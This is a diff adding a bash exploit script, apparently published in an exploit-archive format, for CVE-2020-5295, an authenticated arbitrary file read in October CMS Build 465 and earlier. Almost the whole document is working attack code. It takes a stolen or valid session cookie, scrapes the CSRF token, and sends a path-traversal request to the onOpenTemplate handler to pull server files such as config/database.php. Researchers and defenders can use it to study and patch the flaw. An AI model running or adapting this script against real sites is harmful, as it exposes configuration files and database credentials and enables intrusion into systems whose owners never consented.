@@ -1,0 +1,56 @@
+# Exploit Title: October CMS Build 465 - Arbitrary File Read Exploit (Authenticated)
+# Date: 2020-03-31
+# Exploit Author: Sivanesh Ashok
+# Vendor Homepage: https://octobercms.com/
+# Version: Build 465 and below
+# Tested on: Windows 10 / XAMPP / October CMS Build 465
+# CVE: CVE-2020-5295
+
+echo '''
+Authenticated arbitrary file read exploit for October CMS <= Build 465
+Tested on: v1.0.45
+'''
+
+rm /tmp/ocms_* &> /dev/null
+
+if [[ ! `command -v recode` ]]; then
+	echo -e "[!] Missing package 'recode'\n[!] Install 'recode' using the respective command to resume\n\tsudo apt install recode\n\tsudo pacman -S recode\n\tyum install recode"
+	echo -e "[*] Exiting!\n"
+	exit 0
+fi
+
+read -p "[*] Enter target host (with http/https): " host
+echo ""
+read -p "[*] Enter your cookie value: " cookie
+
+curl -s -X GET -H "Cookie: $cookie" "$host/backend/cms" > /tmp/ocms_gethtml
+
+if [[ ! `awk '/<span class="nav-label">/,/<\/span>/' /tmp/ocms_gethtml | grep "Assets"` ]]; then
+	echo -e "[-] Invalid cookie\n[-] Either the user does not have the privilege to modify assets or the cookie is invalid"
+	echo -e "[*] Exiting!\n"
+	exit 0
+fi
+
+echo '''
+[!] Relative path to the target file is required.
+	eg. config/database.php
+	If you are unsure about the path, check OctoberCMS github which has the default file system hosted
+	https://github.com/octobercms/october
+'''
+
+read -p "[*] Enter path to the target file: " targetfile
+themename=`grep "data-item-theme" /tmp/ocms_gethtml -m 1 | awk -F'"' '{print $6}'`
+csrftoken=`grep "csrf-token" /tmp/ocms_gethtml | awk -F'"' '{print $4}'`
+
+curl -s -X POST -H "Cookie: $cookie" -H "X-CSRF-TOKEN: $csrftoken" -H "X-OCTOBER-REQUEST-HANDLER: onOpenTemplate" -H "X-Requested-With: XMLHttpRequest" -d "theme=$themename" -d "type=asset" -d "path=../../../$targetfile" "$host/backend/cms" > /tmp/ocms_jsonres
+
+cat /tmp/ocms_jsonres | jq -r '.tab' 2> /dev/null | awk '/<textarea/,/<\/textarea>/' 2> /dev/null | recode html > /tmp/ocms_file 2> /dev/null
+
+if [[ `cat /tmp/ocms_file` ]]; then
+	cp /tmp/ocms_file ./october_extractedfile
+	echo -e "\n[+] File saved as ./october_extractedfile!\n"
+	exit 1
+else
+	echo -e "\n[-] Error extracting file. Check /tmp/ocms_jsonres for the server response. Exiting!\n"
+	exit 0
+fi
